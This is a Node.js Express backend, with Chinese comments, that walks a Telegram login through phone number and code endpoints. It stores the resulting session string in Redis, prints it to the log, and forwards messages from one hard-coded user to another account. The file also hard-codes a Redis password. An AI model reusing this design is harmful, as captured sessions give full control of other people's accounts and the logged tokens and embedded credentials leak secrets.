const express = require('express');
const { createClient } = require('redis');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const uuid = require('uuid');
const { NewMessage } = require("telegram/events");

const app = express();
app.use(express.json());

// Redis 连接
const redis = createClient({
  url: 'redis://:test123456@192.168.3.77:44513',
});
redis.connect();

function makeRegisterKey(registerId) {
  return `tg:register:${registerId}`;
}

// 用于保存注册流程的 Promise 和 resolve
const flows = {}; // { registerId: { phonePromise, phoneResolve, codePromise, codeResolve, ... } }

// 工具函数：生成 promise 和对应 resolve
function createDeferred() {
  let resolve;
  const promise = new Promise((res) => { resolve = res; });
  return { promise, resolve };
}

// Step 1: 初始化
app.post('/api/tg/register/init', async (req, res) => {
  const { apiId, apiHash } = req.body;
  if (!apiId || !apiHash) return res.status(400).json({ msg: '缺少参数' });
  const registerId = uuid.v4();

  // 存redis
  await redis.hSet(makeRegisterKey(registerId), { apiId, apiHash, status: 'waitPhone' });

  // 为本次注册流程建 Promise 池
  flows[registerId] = {
    phone: createDeferred(),
    code: createDeferred(),
    password: createDeferred(),
  };

  // 启动注册流程
  doRegisterFlow(registerId);

  res.json({ registerId });
});

// Step 2: 提交手机号
app.post('/api/tg/register/phone', async (req, res) => {
  const { registerId, phone } = req.body;
  if (!registerId || !phone) return res.status(400).json({ msg: '缺少参数' });
  await redis.hSet(makeRegisterKey(registerId), { phone, status: 'waitCode' });

  // resolve phonePromise
  if (flows[registerId]?.phone) flows[registerId].phone.resolve(phone);

  res.json({ msg: 'ok' });
});

// Step 3: 提交验证码
app.post('/api/tg/register/code', async (req, res) => {
  const { registerId, code } = req.body;
  if (!registerId || !code) return res.status(400).json({ msg: '缺少参数' });
  await redis.hSet(makeRegisterKey(registerId), { code, status: 'verifying' });

  // resolve codePromise
  if (flows[registerId]?.code) flows[registerId].code.resolve(code);

  res.json({ msg: 'ok' });
});

// Step 4: 查询注册流程状态
app.get('/api/tg/register/status', async (req, res) => {
  const { registerId } = req.query;
  if (!registerId) return res.status(400).json({ msg: '缺少参数' });
  const result = await redis.hGetAll(makeRegisterKey(registerId));
  res.json(result);
});

// 实际注册流程
async function doRegisterFlow(registerId) {
  const data = await redis.hGetAll(makeRegisterKey(registerId));
  if (!data.apiId || !data.apiHash) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: '参数不全' });
    return;
  }
  try {
    const client = new TelegramClient(
      new StringSession(''),
      Number(data.apiId),
      data.apiHash,
      { connectionRetries: 5 }
    );
    await client.start({
      phoneNumber: async () => {
        // 等待 /phone 提交手机号
        if (flows[registerId]?.phone) return flows[registerId].phone.promise;
        throw new Error('no phone promise');
      },
      phoneCode: async () => {
        // 等待 /code 提交验证码
        if (flows[registerId]?.code) return flows[registerId].code.promise;
        throw new Error('no code promise');
      },
      password: async () => {
        // 默认无密码，也可前端传递
        return '';
      },
      onError: (err) => console.log('GramJS Error:', err),
    });
    const session = client.session.save();
    await redis.hSet(makeRegisterKey(registerId), { session, status: 'done' });
    console.log(`[SUCCESS] Register done: ${registerId}, session: ${session}`);
    // 监听机制
    client.addEventHandler(
      async (event) => {
        // 判断 senderId 是否为 8088901247
        if (event.message.senderId && event.message.senderId.valueOf() === 8088901247) {
          const msgText = event.message.text || "";
          const fromPeer = await event.message.getInputChat();
          console.log("收到来自 8088901247 的消息：", msgText);

          if (msgText.includes("123")) {
            await client.forwardMessages(7700169264, {
              messages: [event.message.id], // 建议用数组
              fromPeer: fromPeer
            });
            // 包含“123”，发送“成功”
            await client.sendMessage(7700169264, { message: "成功" });
          } else {
            // 不包含“123”，转发并发送“失败”
            if (!fromPeer) {
              console.log("无法获取 fromPeer，消息未转发");
              return;
            }
            await client.forwardMessages(7700169264, {
              messages: [event.message.id], // 建议用数组
              fromPeer: fromPeer
            });
            await client.sendMessage(7700169264, { message: "失败" });
          }
        }
      },
      new NewMessage({})
    );

    // 防止进程自动退出
    setInterval(() => {}, 100000);
  } catch (e) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: e.message });
    console.log(`[FAIL] Register error: ${registerId},`, e);
  } finally {
    // 注册流程完毕后删除 Promise，防内存泄漏
    delete flows[registerId];
  }
}



app.listen(8080, () => {
  console.log('后端服务已启动：http://localhost:8080');
});
